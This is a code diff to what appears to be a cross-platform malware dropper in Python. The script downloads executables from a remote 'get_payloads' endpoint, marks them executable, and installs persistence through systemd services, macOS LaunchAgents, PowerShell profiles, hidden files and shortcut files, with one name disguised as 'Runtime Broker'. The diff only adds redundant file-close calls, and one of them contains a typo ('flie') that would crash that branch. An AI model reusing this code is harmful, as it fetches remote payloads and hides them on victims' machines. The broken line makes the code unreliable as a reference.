@@ -49,6 +49,7 @@ RestartSec=5
 [Install]
 WantedBy=default.target"""
             )
+            f.close()
 
         # Reload systemd, start and enable the service
         subprocess.run(
@@ -88,6 +89,7 @@ WantedBy=default.target"""
         plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{label}.plist")
         with open(plist_path, "w") as f:
             f.write(plist_content)
+            f.close()
         os.system(f"launchctl load {plist_path}")
 
     def create_powershell_profile(path, name):
@@ -115,6 +117,7 @@ try {
 }
 }"""
             )
+            f.close()
 
         create_hidden_file(directory)
 
@@ -126,6 +129,7 @@ try {
 
         with open(shortcut_path, "w") as shortcut:
             shortcut.write(f"[InternetShortcut]\nURL=file:///{path}")
+            shortcut.close()
 
         return shortcut_path
 
@@ -151,6 +155,7 @@ try {
             response = requests.get(f"{url}get_payloads/{download_path}.exe")
             with open(file_path, "wb") as file:
                 file.write(response.content)
+                file.close()
 
         # try:
         # create_powershell_profile(file_path, "Runtime Broker")
@@ -177,6 +182,7 @@ try {
             response = requests.get(f"{url}get_payloads/{download_path}")
             with open(file_path, "wb") as file:
                 file.write(response.content)
+                flie.close()
             os.chmod(file_path, 0o777)
         # Create a hidden file and add a crontab job
         create_systemd_service(file_path)
@@ -188,6 +194,7 @@ try {
             response = requests.get(f"{url}get_payloads/{download_path}")
             with open(file_path, "wb") as file:
                 file.write(response.content)
+                file.close()
 
         create_hidden_file(file_path)
         create_launch_agent(file_path, "com.yourname.launcher")
